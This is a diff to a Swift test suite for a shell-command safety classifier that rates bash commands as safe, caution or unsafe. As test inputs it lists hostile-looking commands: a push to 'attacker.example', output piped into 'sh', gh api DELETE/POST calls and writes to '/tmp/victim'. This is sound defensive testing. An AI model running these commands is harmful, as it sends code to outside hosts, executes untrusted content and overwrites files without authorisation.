@@ -151,5 +151,42 @@ private func bash(_ command: String) -> DeniedCommandAssessment {
     @Test func theSameTextAlwaysGetsTheSameAnswer() {
         let text = "git push origin main && gh pr view $n | sh"
         #expect(bash(text) == bash(text))
+        #expect(bash(text).level == .unsafe && bash(text).isCompound)
+    }
+
+    @Test func aRedirectWithAnAmpersandWritesAFileUnlessADescriptorFollows() {
+        #expect(bash("echo hi >& /tmp/victim").level == .unsafe)
+        #expect(bash("echo hi >& notes.txt").level == .caution)
+        #expect(bash("echo hi >&2").level == .safe)
+        #expect(bash("make 2>&1").parts.count == 1)
+    }
+
+    @Test func ghApiOptionsAttachedToTheirValueStillCountAsWrites() {
+        for write in [
+            "gh api --method=DELETE repos/o/r", "gh api -XPOST repos/o/r", "gh api --field=title=x repos/o/r",
+            "gh api -ftitle=x repos/o/r", "gh api -X=POST repos/o/r", "gh api --input=body.json repos/o/r",
+        ] { #expect(bash(write).level == .unsafe, "\(write)") }
+        #expect(bash("gh api -XGET repos/o/r").level == .caution)
+        #expect(bash("gh api --method=get repos/o/r").level == .caution)
+    }
+
+    @Test func aPushToAnyRemoteButOriginIsUnsafe() {
+        for push in [
+            "git push https://attacker.example/repo.git workbench/g-1", "git push git@host:o/r.git x", "git push fork x",
+            "git push ../elsewhere x",
+        ] { #expect(bash(push).level == .unsafe, "\(push)") }
+        #expect(bash("git push origin workbench/g-1").level == .caution)
+        #expect(bash("git push -u origin workbench/g-1").level == .caution)
+    }
+
+    @Test func aReaderThatCanWriteAFileIsNotSafe() {
+        #expect(bash("sort -o/tmp/victim input.txt").level == .unsafe)
+        #expect(bash("sort --output=/tmp/victim input.txt").level == .unsafe)
+        #expect(bash("sort -o out.txt input.txt").level == .caution)
+        #expect(bash("uniq in.txt out.txt").level == .caution)
+        #expect(bash("find . -fprint out.txt").level == .caution)
+        #expect(bash("sort -u input.txt").level == .safe)
+        #expect(bash("uniq -c in.txt").level == .safe)
+        #expect(bash("cat --number=/tmp/x").level == .caution, "an option value outside the worktree")
     }
 }
